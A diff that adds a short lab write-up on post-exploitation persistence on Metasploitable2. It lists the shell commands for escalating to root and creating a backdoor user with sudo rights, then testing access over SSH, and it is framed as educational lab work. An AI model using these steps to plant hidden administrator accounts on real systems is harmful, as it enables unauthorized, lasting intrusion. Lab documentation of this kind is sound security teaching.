@@ -1,0 +1,38 @@
+Post-Exploitation Phase: User Persistence
+Creation
+Objective
+To establish persistent access on the compromised system by creating a new administrative user
+account on the target machine, ensuring continued access beyond the initial exploitation phase.
+Target Environment
+Target System: Metasploitable2
+Attack Platform: Metasploit Framework
+Access Level: Post-exploitation shell / Meterpreter session
+Procedure
+Accessing the Target System
+shell
+Privilege Enumeration
+whoami
+id
+Privilege Escalation
+sudo su
+Creating a New User Account
+useradd -m -s /bin/bash fortune
+Setting User Password
+passwd fortune
+Granting Administrative Privileges
+usermod -aG sudo fortune
+Verification of User Creation
+id fortune
+Testing Persistent Access
+ssh fortune@<target-ip>
+Results
+A new administrative user account was successfully created. The account was granted elevated
+privileges and persistent access was confirmed.
+Discussion
+This demonstrates a common post-exploitation persistence technique where attackers maintain
+long-term access by creating privileged accounts.
+Conclusion
+The lab successfully achieved persistence, highlighting the importance of monitoring unauthorized
+account creation.
+Ethical Consideration
+This activity was conducted strictly within a controlled lab environment for educational purposes.
